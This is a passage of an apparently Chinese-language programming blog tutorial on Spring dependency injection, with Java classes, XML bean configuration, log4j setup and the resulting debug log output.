class=\"line\">\t\t</span><br><span class=\"line\"><span class=\"comment\">//\t\tprinter.setService(service);</span></span><br><span class=\"line\">\t\tprinter.printMessage();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><figcaption><span>MessagePrinter.java</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> hello;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Component</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MessagePrinter</span> </span>&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t * 設定 MessageService 關係</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> MessageService service;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MessagePrinter</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">super</span>();</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"MessagePrinter...\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t * 設定 service 值</span></span><br><span class=\"line\"><span class=\"comment\">\t * <span class=\"doctag\">@param</span> service</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"meta\">@Autowired</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setService</span><span class=\"params\">(MessageService service)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>.service = service;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">printMessage</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\tSystem.out.print(<span class=\"keyword\">this</span>.service.getMessage());</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><figcaption><span>MessageService.java</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> hello;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Component</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MessageService</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MessageService</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">super</span>();</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"MessageService...\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\t * print Hello World</span></span><br><span class=\"line\"><span class=\"comment\">\t * <span class=\"doctag\">@return</span> print Hello World</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">getMessage</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">\"Hello World\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Spring-Autowired-方式-xml\"><a href=\"#Spring-Autowired-方式-xml\" class=\"headerlink\" title=\"Spring Autowired 方式(xml)\"></a>Spring Autowired 方式(xml)</h2><p>傳統 XML 配置</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> hello;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.context.ApplicationContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.context.annotation.ClassPathXmlApplicationContext;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ApplicationSpring</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"applicationSpring\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tApplicationContext context = <span class=\"keyword\">new</span> ClassPathXmlApplicationContext(<span class=\"string\">\"applicationContext.xml\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// 從容器中獲取 MessagePrinter 物件</span></span><br><span class=\"line\">\t\tMessagePrinter printer = context.getBean(MessagePrinter.class);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tSystem.out.println(printer);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tprinter.printMessage();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其他的 Java 就把所有 @xxx 拿掉</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?</span>xml version=<span class=\"string\">\"1.0\"</span> encoding=<span class=\"string\">\"UTF-8\"</span><span class=\"meta\">?&gt;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema-instance\"</span> <span class=\"attr\">xmlns:context</span>=<span class=\"string\">\"http://www.springframework.org/schema/context\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">    http://www.springframework.org/schema/beans/spring-beans.xsd </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">    http://www.springframework.org/schema/context </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">    http://www.springframework.org/schema/context/spring-context.xsd\"</span>&gt;</span></span><br><span class=\"line\">     </span><br><span class=\"line\">    <span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">        bean 元素: 描述當前的物件需要由 spring 容器管理</span></span><br><span class=\"line\"><span class=\"comment\">        id 屬性: 標示物件，未來在應用程序中可以根據 id 獲取物件</span></span><br><span class=\"line\"><span class=\"comment\">        class: 被管理物件的類全名</span></span><br><span class=\"line\"><span class=\"comment\">    --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"service\"</span>    <span class=\"attr\">class</span>=<span class=\"string\">\"hello.MessageService\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">        &lt;property name=\"service\" ...</span></span><br><span class=\"line\"><span class=\"comment\">        這邊的 name 是指 MessagePrinter.java</span></span><br><span class=\"line\"><span class=\"comment\">        \tprivate MessageService service;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">        ref=\"service\"</span></span><br><span class=\"line\"><span class=\"comment\">        這邊的 service 是指上面的</span></span><br><span class=\"line\"><span class=\"comment\">        &lt;bean id=\"service\"    class=\"hello.MessageService\"&gt;&lt;/bean&gt;</span></span><br><span class=\"line\"><span class=\"comment\">    --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"printer\"</span>    <span class=\"attr\">class</span>=<span class=\"string\">\"hello.MessagePrinter\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"service\"</span> <span class=\"attr\">ref</span>=<span class=\"string\">\"service\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></span><br><span class=\"line\">     </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>Application</p>\n<h3 id=\"Eclipse-建置-applicationContext-xml\"><a href=\"#Eclipse-建置-applicationContext-xml\" class=\"headerlink\" title=\"Eclipse 建置 applicationContext.xml\"></a>Eclipse 建置 applicationContext.xml</h3><p><a href=\"https://www.itdaan.com/tw/aca117e170d18e2da5fd791876dfece2\" target=\"_blank\" rel=\"noopener\">eclipse 新建applicationContext.xml文件 - 开发者知识库</a></p>\n<p>目前只找到複製方式貼上…</p>\n<figure class=\"highlight xml\"><figcaption><span>applicationContext.xml</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?</span>xml version=<span class=\"string\">\"1.0\"</span> encoding=<span class=\"string\">\"UTF-8\"</span><span class=\"meta\">?&gt;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema-instance\"</span> <span class=\"attr\">xmlns:context</span>=<span class=\"string\">\"http://www.springframework.org/schema/context\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">\"http://www.springframework.org/schema/beans </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">    http://www.springframework.org/schema/beans/spring-beans.xsd </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">    http://www.springframework.org/schema/context </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">    http://www.springframework.org/schema/context/spring-context.xsd\"</span>&gt;</span></span><br><span class=\"line\">     </span><br><span class=\"line\">     </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>這樣就能正常執行了</p>\n<h3 id=\"Resource-leak-context-is-never-closed\"><a href=\"#Resource-leak-context-is-never-closed\" class=\"headerlink\" title=\"Resource leak: context is never closed\"></a>Resource leak: context is never closed</h3><ul>\n<li><a href=\"https://blog.csdn.net/seagal890/article/details/53958868\" target=\"_blank\" rel=\"noopener\">警告：Spring ApplicationContext - Resource leak: context is never closed的处理<em>Java</em>梅森上校的博客 业精于勤荒于嬉，形成于思毁于随。-CSDN博客</a></li>\n<li><a href=\"https://stackoverflow.com/questions/26573767/how-does-this-code-resolve-resource-leakcontext-is-never-closed-warning\" target=\"_blank\" rel=\"noopener\">spring - How does this code resolve “Resource Leak:’context’ is never closed” warning? - Stack Overflow</a><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">((ConfigurableApplicationContext) context).close();</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"Spring-查看-log4j-IoC-過程\"><a href=\"#Spring-查看-log4j-IoC-過程\" class=\"headerlink\" title=\"Spring 查看 log4j IoC 過程\"></a>Spring 查看 log4j IoC 過程</h2><p>Spring 使用 common-logging ，所以看一下關方文件說明</p>\n<blockquote>\n<p>To make Log4j 1.2 work with the default JCL dependency (commons-logging) all you need to do is put Log4j on the classpath, and provide it with a configuration file (log4j.properties or log4j.xml in the root of the classpath)</p>\n</blockquote>\n<p><a href=\"https://docs.spring.io/spring/docs/4.3.13.RELEASE/spring-framework-reference/html/overview.html#overview-logging-log4j\" target=\"_blank\" rel=\"noopener\">2. Introduction to the Spring Framework</a></p>\n<p>common-logging 跟 slf4j 差別<br><a href=\"https://blog.csdn.net/yycdaizi/article/details/8276265\" target=\"_blank\" rel=\"noopener\">java日志组件介绍（common-logging，log4j，slf4j，logback ）_Java_yycdaizi的专栏-CSDN博客</a></p>\n<blockquote>\n<p>slf4j 與 common-logging 比較<br>common-logging通過動態查找的機制，在程序運行時自動找出真正使用的日誌庫。由於它使用了ClassLoader尋找和載入底層的日誌庫， 導致了象OSGI這樣的框架無法正常工作，因為OSGI的不同的插件使用自己的ClassLoader。 OSGI的這種機制保證了插件互相獨立，然而卻使Apache Common-Logging無法工作。<br>slf4j在編譯時靜態綁定真正的Log庫,因此可以再OSGI中使用。另外，SLF4J 支持參數化的log字符串，避免了之前為了減少字符串拼接的性能損耗而不得不寫的if(logger.isDebugEnable())，現在你可以直接寫：logger.debug(「current user is: {}」, user)。拼裝消息被推遲到了它能夠確定是不是要顯示這條消息的時候，但是獲取參數的代價並沒有倖免。</p>\n</blockquote>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>log4j<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>log4j<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.2.17<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><figcaption><span>log4j.properties</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"># info 級別日誌，名子叫 stdout</span><br><span class=\"line\">log4j.rootCategory=INFO, stdout</span><br><span class=\"line\"></span><br><span class=\"line\"># 輸出到控制台上輸出</span><br><span class=\"line\">log4j.appender.stdout=org.apache.log4j.ConsoleAppender</span><br><span class=\"line\"># 按照一定格式輸出</span><br><span class=\"line\">log4j.appender.stdout.layout=org.apache.log4j.PatternLayout</span><br><span class=\"line\">log4j.appender.stdout.layout.ConversionPattern=%d&#123;ABSOLUTE&#125; %5p %t %c&#123;2&#125;:%L - %m%n</span><br><span class=\"line\"># spring factory debug 級別輸出</span><br><span class=\"line\">log4j.category.org.springframework.beans.factory=DEBUG</span><br></pre></td></tr></table></figure>\n<p>不同 log (SLF4J) 設定可以看<a href=\"https://docs.spring.io/spring/docs/4.3.13.RELEASE/spring-framework-reference/html/overview.html#overview-logging-log4j\" target=\"_blank\" rel=\"noopener\">2. Introduction to the Spring Framework</a></p>\n<p>這實候執行程式</p>\n<p>可以看到以下 log<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">applicationSpring</span><br><span class=\"line\">16:44:28,186  INFO main support.ClassPathXmlApplicationContext:583 - Refreshing org.springframework.context.support.ClassPathXmlApplicationContext@2a18f23c: startup date [Sat May 02 16:44:28 CST 2020]; root of context hierarchy</span><br><span class=\"line\">16:44:28,220  INFO main xml.XmlBeanDefinitionReader:317 - Loading XML bean definitions from class path resource [applicationContext.xml]</span><br><span class=\"line\">16:44:28,242 DEBUG main xml.DefaultDocumentLoader:73 - Using JAXP provider [com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl]</span><br><span class=\"line\">16:44:28,266 DEBUG main xml.PluggableSchemaResolver:141 - Loading schema mappings from [META-INF/spring.schemas]</span><br><span class=\"line\">16:44:28,270 DEBUG main xml.PluggableSchemaResolver:147 - Loaded schema mappings: &#123;http://www.springframework.org/schema/context/spring-context-3.2.xsd=org/springframework/context/config/spring-context-3.2.xsd, http://www.springframework.org/schema/cache/spring-cache-4.3.xsd=org/springframework/cache/config/spring-cache-4.3.xsd, http://www.springframework.org/schema/beans/spring-beans-4.0.xsd=org/springframework/beans/factory/xml/spring-beans-4.0.xsd, http://www.springframework.org/schema/context/spring-context-2.5.xsd=org/springframework/context/config/spring-context-2.5.xsd, http://www.springframework.org/schema/context/spring-context-4.0.xsd=org/springframework/context/config/spring-context-4.0.xsd, http://www.springframework.org/schema/util/spring-util-4.3.xsd=org/springframework/beans/factory/xml/spring-util-4.3.xsd, http://www.springframework.org/schema/jee/spring-jee-2.0.xsd=org/springframework/ejb/config/spring-jee-2.0.xsd, http://www.springframework.org/schema/aop/spring-aop-2.0.xsd=org/springframework/aop/config/spring-aop-2.0.xsd, http://www.springframework.org/schema/tool/spring-tool-4.3.xsd=org/springframework/beans/factory/xml/spring-tool-4.3.xsd, http://www.springframework.org/schema/util/spring-util-2.0.xsd=org/springframework/beans/factory/xml/spring-util-2.0.xsd, http://www.springframework.org/schema/cache/spring-cache-4.2.xsd=org/springframework/cache/config/spring-cache-4.2.xsd, http://www.springframework.org/schema/context/spring-context-3.1.xsd=org/springframework/context/config/spring-context-3.1.xsd, http://www.springframework.org/schema/tool/spring-tool-2.0.xsd=org/springframework/beans/factory/xml/spring-tool-2.0.xsd, http://www.springframework.org/schema/tool/spring-tool.xsd=org/springframework/beans/factory/xml/spring-tool-4.3.xsd, http://www.springframework.org/schema/beans/spring-beans-3.2.xsd=org/springframework/beans/factory/xml/spring-beans-3.2.xsd, http://www.springframework.org/schema/util/spring-util-4.2.xsd=org/springframework/beans/factory/xml/spring-util-4.2.xsd, http://www.springframework.org/schema/beans/spring-beans-2.5.xsd=org/springframework/beans/factory/xml/spring-beans-2.5.xsd, http://www.springframework.org/schema/beans/spring-beans.xsd=org/springframework/beans/factory/xml/spring-beans-4.3.xsd, http://www.springframework.org/schema/tool/spring-tool-4.0.xsd=org/springframework/beans/factory/xml/spring-tool-4.0.xsd, http://www.springframework.org/schema/util/spring-util-4.1.xsd=org/springframework/beans/factory/xml/spring-util-4.1.xsd, http://www.springframework.org/schema/beans/spring-beans-4.2.xsd=org/springframework/beans/factory/xml/spring-beans-4.2.xsd, http://www.springframework.org/schema/context/spring-context-4.2.xsd=org/springframework/context/config/spring-context-4.2.xsd, http://www.springframework.org/schema/cache/spring-cache-4.1.xsd=org/springframework/cache/config/spring-cache-4.1.xsd, http://www.springframework.org/schema/lang/spring-lang-3.0.xsd=org/springframework/scripting/config/spring-lang-3.0.xsd, http://www.springframework.org/schema/jee/spring-jee-4.3.xsd=org/springframework/ejb/config/spring-jee-4.3.xsd, http://www.springframework.org/schema/aop/spring-aop-4.3.xsd=org/springframework/aop/config/spring-aop-4.3.xsd, http://www.springframework.org/schema/beans/spring-beans-4.3.xsd=org/springframework/beans/factory/xml/spring-beans-4.3.xsd, http://www.springframework.org/schema/tool/spring-tool-4.1.xsd=org/springframework/beans/factory/xml/spring-tool-4.1.xsd, http://www.springframework.org/schema/task/spring-task-4.3.xsd=org/springframework/scheduling/config/spring-task-4.3.xsd, http://www.springframework.org/schema/util/spring-util-4.0.xsd=org/springframework/beans/factory/xml/spring-util-4.0.xsd, http://www.springframework.org/schema/beans/spring-beans-4.1.xsd=org/springframework/beans/factory/xml/spring-beans-4.1.xsd, http://www.springframework.org/schema/lang/spring-lang.xsd=org/springframework/scripting/config/spring-lang-4.3.xsd, http://www.springframework.org/schema/cache/spring-cache-4.0.xsd=org/springframework/cache/config/spring-cache-4.0.xsd, http://www.springframework.org/schema/context/spring-context-4.1.xsd=org/springframework/context/config/spring-context-4.1.xsd, http://www.springframework.org/schema/aop/spring-aop-4.2.xsd=org/springframework/aop/config/spring-aop-4.2.xsd, http://www.springframework.org/schema/tool/spring-tool-4.2.xsd=org/springframework/beans/factory/xml/spring-tool-4.2.xsd, http://www.springframework.org/schema/util/spring-util-2.5.xsd=org/springframework/beans/factory/xml/spring-util-2.5.xsd, http://www.springframework.org/schema/jee/spring-jee-4.2.xsd=org/springframework/ejb/config/spring-jee-4.2.xsd, http://www.springframework.org/schema/lang/spring-lang-3.1.xsd=org/springframework/scripting/config/spring-lang-3.1.xsd, http://www.springframework.org/schema/task/spring-task.xsd=org/springframework/scheduling/config/spring-task-4.3.xsd, http://www.springframework.org/schema/task/spring-task-4.2.xsd=org/springframework/scheduling/config/spring-task-4.2.xsd, http://www.springframework.org/schema/aop/spring-aop.xsd=org/springframework/aop/config/spring-aop-4.3.xsd, http://www.springframework.org/schema/lang/spring-lang-4.0.xsd=org/springframework/scripting/config/spring-lang-4.0.xsd, http://www.springframework.org/schema/beans/spring-beans-2.0.xsd=org/springframework/beans/factory/xml/spring-beans-2.0.xsd, http://www.springframework.org/schema/task/spring-task-4.1.xsd=org/springframework/scheduling/config/spring-task-4.1.xsd, http://www.springframework.org/schema/tool/spring-tool-3.1.xsd=org/springframework/beans/factory/xml/spring-tool-3.1.xsd, http://www.springframework.org/schema/util/spring-util-3.2.xsd=org/springframework/beans/factory/xml/spring-util-3.2.xsd, http://www.springframework.org/schema/jee/spring-jee-4.1.xsd=org/springframework/ejb/config/spring-jee-4.1.xsd, http://www.springframework.org/schema/lang/spring-lang-3.2.xsd=org/springframework/scripting/config/spring-lang-3.2.xsd, http://www.springframework.org/schema/cache/spring-cache-3.2.xsd=org/springframework/cache/config/spring-cache-3.2.xsd, http://www.springframework.org/schema/aop/spring-aop-4.1.xsd=org/springframework/aop/config/spring-aop-4.1.xsd, http://www.springframework.org/schema/util/spring-util.xsd=org/springframework/beans/factory/xml/spring-util-4.3.xsd, http://www.springframework.org/schema/jee/spring-jee-3.2.xsd=org/springframework/ejb/config/spring-jee-3.2.xsd, http://www.springframework.org/schema/util/spring-util-3.0.xsd=org/springframework/beans/factory/xml/spring-util-3.0.xsd, http://www.springframework.org/schema/lang/spring-lang-4.1.xsd=org/springframework/scripting/config/spring-lang-4.1.xsd, http://www.springframework.org/schema/aop/spring-aop-3.2.xsd=org/springframework/aop/config/spring-aop-3.2.xsd, http://www.springframework.org/schema/tool/spring-tool-3.2.xsd=org/springframework/beans/factory/xml/spring-tool-3.2.xsd, http://www.springframework.org/schema/context/spring-context-4.3.xsd=org/springframework/context/config/spring-context-4.3.xsd, http://www.springframework.org/schema/lang/spring-lang-2.5.xsd=org/springframework/scripting/config/spring-lang-2.5.xsd, http://www.springframework.org/schema/jee/spring-jee.xsd=org/springframework/ejb/config/spring-jee-4.3.xsd, http://www.springframework.org/schema/util/spring-util-3.1.xsd=org/springframework/beans/factory/xml/spring-util-3.1.xsd, http://www.springframework.org/schema/jee/spring-jee-2.5.xsd=org/springframework/ejb/config/spring-jee-2.5.xsd, http://www.springframework.org/schema/task/spring-task-4.0.xsd=org/springframework/scheduling/config/spring-task-4.0.xsd, http://www.springframework.org/schema/aop/spring-aop-2.5.xsd=org/springframework/aop/config/spring-aop-2.5.xsd, http://www.springframework.org/schema/context/spring-context.xsd=org/springframework/context/config/spring-context-4.3.xsd, http://www.springframework.org/schema/cache/spring-cache-3.1.xsd=org/springframework/cache/config/spring-cache-3.1.xsd, http://www.springframework.org/schema/aop/spring-aop-4.0.xsd=org/springframework/aop/config/spring-aop-4.0.xsd, http://www.springframework.org/schema/jee/spring-jee-4.0.xsd=org/springframework/ejb/config/spring-jee-4.0.xsd, http://www.springframework.org/schema/tool/spring-tool-2.5.xsd=org/springframework/beans/factory/xml/spring-tool-2.5.xsd, http://www.springframework.org/schema/task/spring-task-3.2.xsd=org/springframework/scheduling/config/spring-task-3.2.xsd, http://www.springframework.org/schema/beans/spring-beans-3.0.xsd=org/springframework/beans/factory/xml/spring-beans-3.0.xsd, http://www.springframework.org/schema/jee/spring-jee-3.0.xsd=org/springframework/ejb/config/spring-jee-3.0.xsd, http://www.springframework.org/schema/aop/spring-aop-3.1.xsd=org/springframework/aop/config/spring-aop-3.1.xsd, http://www.springframework.org/schema/jee/spring-jee-3.1.xsd=org/springframework/ejb/config/spring-jee-3.1.xsd, http://www.springframework.org/schema/lang/spring-lang-4.3.xsd=org/springframework/scripting/config/spring-lang-4.3.xsd, http://www.springframework.org/schema/aop/spring-aop-3.0.xsd=org/springframework/aop/config/spring-aop-3.0.xsd, http://www.springframework.org/schema/beans/spring-beans-3.1.xsd=org/springframework/beans/factory/xml/spring-beans-3.1.xsd, http://www.springframework.org/schema/lang/spring-lang-2.0.xsd=org/springframework/scripting/config/spring-lang-2.0.xsd, http://www.springframework.org/schema/task/spring-task-3.1.xsd=org/springframework/scheduling/config/spring-task-3.1.xsd, http://www.springframework.org/schema/lang/spring-lang-4.2.xsd=org/springframework/scripting/config/spring-lang-4.2.xsd, http://www.springframework.org/schema/tool/spring-tool-3.0.xsd=org/springframework/beans/factory/xml/spring-tool-3.0.xsd, http://www.springframework.org/schema/task/spring-task-3.0.xsd=org/springframework/scheduling/config/spring-task-3.0.xsd, http://www.springframework.org/schema/context/spring-context-3.0.xsd=org/springframework/context/config/spring-context-3.0.xsd, http://www.springframework.org/schema/cache/spring-cache.xsd=org/springframework/cache/config/spring-cache-4.3.xsd&#125;</span><br><span class=\"line\">16:44:28,272 DEBUG main xml.PluggableSchemaResolver:119 - Found XML schema [http://www.springframework.org/schema/beans/spring-beans.xsd] in classpath: org/springframework/beans/factory/xml/spring-beans-4.3.xsd</span><br><span class=\"line\">16:44:28,303 DEBUG main xml.DefaultBeanDefinitionDocumentReader:92 - Loading bean definitions</span><br><span class=\"line\">16:44:28,312 DEBUG main xml.XmlBeanDefinitionReader:224 - Loaded 2 bean definitions from location pattern [applicationContext.xml]</span><br><span class=\"line\">16:44:28,329 DEBUG main support.DefaultListableBeanFactory:730 - Pre-instantiating singletons in org.springframework.beans.factory.support.DefaultListableBeanFactory@36f0f1be: defining beans [service,printer]; root of factory hierarchy</span><br><span class=\"line\">16:44:28,330 DEBUG main support.DefaultListableBeanFactory:221 - Creating shared instance of singleton bean &apos;service&apos;</span><br><span class=\"line\">16:44:28,330 DEBUG main support.DefaultListableBeanFactory:449 - Creating instance of bean &apos;service&apos;</span><br><span class=\"line\">MessageService...</span><br><span class=\"line\">16:44:28,337 DEBUG main support.DefaultListableBeanFactory:539 - Eagerly caching bean &apos;service&apos; to allow for resolving potential circular references</span><br><span class=\"line\">16:44:28,338 DEBUG main support.DefaultListableBeanFactory:485 - Finished creating instance of bean &apos;service&apos;</span><br><span class=\"line\">16:44:28,338 DEBUG main support.DefaultListableBeanFactory:221 - Creating shared instance of singleton bean &apos;printer&apos;</span><br><span class=\"line\">16:44:28,338 DEBUG main support.DefaultListableBeanFactory:449 - Creating instance of bean &apos;printer&apos;</span><br><span class=\"line\">MessagePrinter...</span><br><span class=\"line\">16:44:28,338 DEBUG main support.DefaultListableBeanFactory:539 - Eagerly caching bean &apos;printer&apos; to allow for resolving potential circular references</span><br><span class=\"line\">16:44:28,339 DEBUG main support.DefaultListableBeanFactory:251 - Returning cached instance of singleton bean &apos;service&apos;</span><br><span class=\"line\">16:44:28,350 DEBUG main support.DefaultListableBeanFactory:485 - Finished creating instance of bean &apos;printer&apos;</span><br><span class=\"line\">16:44:28,351 DEBUG main support.DefaultListableBeanFactory:251 - Returning cached instance of singleton bean &apos;lifecycleProcessor&apos;</span><br><span class=\"line\">16:44:28,353 DEBUG main support.DefaultListableBeanFactory:251 - Returning cached instance of singleton bean &apos;printer&apos;</span><br><span class=\"line\">hello.MessagePrinter@61230f6a</span><br><span class=\"line\">Hello World</span><br></pre></td></tr></table></figure></p>\n<p>簡單重點 log 說明</p>\n<ol>\n<li><p>Using JAXP provider 使用 JAXP 解析 XML</p>\n</li>\n<li><p>Loading bean definitions  加載 bean 節點</p>\n</li>\n<li><p>Creating shared instance of singleton bean ‘service’ 使用單立模式新增 service 物件</p>\n</li>\n</ol>\n<p>意思程式執行時候，會把所有 bean 實例出來!!</p>\n<h3 id=\"log4j-WARN-No-appenders-could-be-found-for-logger-org-springframework-core-env-StandardEnvironment\"><a href=\"#log4j-WARN-No-appenders-could-be-found-for-logger-org-springframework-core-env-StandardEnvironment\" class=\"headerlink\" title=\"log4j:WARN No appenders could be found for logger (org.springframework.core.env.StandardEnvironment).\"></a>log4j:WARN No appenders could be found for logger (org.springframework.core.env.StandardEnvironment).</h3><p>出現這個代表 log設定檔放錯地方</p>\n<p>src\\main\\resources\\log4j.properties</p>\n<h2 id=\"autowired-加載方式\"><a href=\"#autowired-加載方式\" class=\"headerlink\" title=\"autowired 加載方式\"></a>autowired 加載方式</h2><p>TODO</p>\n<h4 id=\"建構子\"><a href=\"#建構子\" class=\"headerlink\" title=\"建構子\"></a>建構子</h4><h4 id=\"成員變數\"><a href=\"#成員變數\" class=\"headerlink\" title=\"成員變數\"></a>成員變數</h4><h4 id=\"setter-method\"><a href=\"#setter-method\" class=\"headerlink\" title=\"setter method\"></a>setter method</h4><h4 id=\"任意-method\"><a href=\"#任意-method\" class=\"headerlink\" 